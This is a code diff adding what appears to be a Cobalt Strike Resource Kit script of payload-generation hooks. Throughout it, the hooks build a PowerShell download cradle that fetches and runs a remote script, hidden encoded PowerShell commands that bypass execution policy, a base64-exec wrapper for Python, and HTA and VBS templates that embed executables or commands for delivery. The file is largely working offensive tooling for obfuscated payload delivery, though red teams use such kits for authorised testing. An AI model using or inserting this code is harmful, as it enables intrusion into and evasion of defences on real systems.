+set POWERSHELL_COMPRESS {
+   print_info("Resource - POWERSHELL_COMPRESS hook");
+
+   local('$script_path $handle $data');
+
+   $script_path = getFileProper($resource_kit_path, "compress.ps1");
+   if (!-isFile $script_path) {
+      print_error("Resource - Script not found " . $script_path );
+      return $null;
+   }
+
+   # read in our compress template
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   # compress our script, base64 encode that, patch into compress.ps1
+   return strrep($data, '%%DATA%%', base64_encode(gzip($1)));
+}
+
+# PowerShell Download Cradle
+# $1 = URL to snag PowerShell script from. (often http://127.0.0.1:[port]/)
+set POWERSHELL_DOWNLOAD_CRADLE {
+   print_info("Resource - POWERSHELL_DOWNLOAD_CRADLE hook");
+   return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
+}
+
+# Format our PowerShell Commands
+# $1 = the script we want to run, $2 = are we destined for a remote system? [true or false]
+set POWERSHELL_COMMAND {
+   print_info("Resource - POWERSHELL_COMMAND hook");
+
+   local('$script');
+   $script = transform($1, "powershell-base64");
+   
+   # remote command (e.g., psexec_psh, wmi, etc.)
+   if ($2) {
+      return "powershell -nop -w hidden -encodedcommand $script";
+   }
+   # local command
+   else {
+      return "powershell -nop -exec bypass -EncodedCommand $script";
+   }
+}
+
+# reduce the size of a Python script. (or not)
+# $1 = the script to compress...
+set PYTHON_COMPRESS {
+   print_info("Resource - PYTHON_COMPRESS hook");
+   return "import base64; exec base64.b64decode(\"" . base64_encode($1) . "\")";
+}
+
+# HTML Application (Executable) Template
+# $1 = the EXE data, $2 = name of the .exe
+set HTMLAPP_EXE {
+   print_info("Resource - HTMLAPP_EXE hook");
+
+   local('$script_path $handle $data');
+
+   $script_path = getFileProper($resource_kit_path, "template.exe.hta");
+   if (!-isFile $script_path) {
+      print_error("Resource - Script not found " . $script_path );
+      return $null;
+   }
+
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   $data   = strrep($data, '##EXE##', transform($1, "hex"));
+   $data   = strrep($data, '##NAME##', $2);
+
+   return $data;
+}
+
+# HTML Application (PowerShell) Template
+# $1 = the command to run
+set HTMLAPP_POWERSHELL {
+   print_info("Resource - HTMLAPP_POWERSHELL hook");
+
+   local('$script_path $handle $data');
+
+   $script_path = getFileProper($resource_kit_path, "template.psh.hta");
+   if (!-isFile $script_path) {
+      print_error("Resource - Script not found " . $script_path );
+      return $null;
+   }
+
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   # push our command into the script
+   return strrep($data, "%%DATA%%", $1);
+}
+
+# VBS Template
+# $1 = the macro to embed
+set RESOURCE_GENERATOR_VBS {
+   print_info("Resource - RESOURCE_GENERATOR_VBS hook");
+
+   local('$script_path $handle $data');
+
+   $script_path = getFileProper($resource_kit_path, "template.vbs");
+
+   if (!-isFile $script_path) {
+      print_error("Resource - Script not found " . $script_path );
+      return $null;
+   }
+
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   return strrep($data, '$$CODE$$', transform_vbs($1, 8));
+}
+
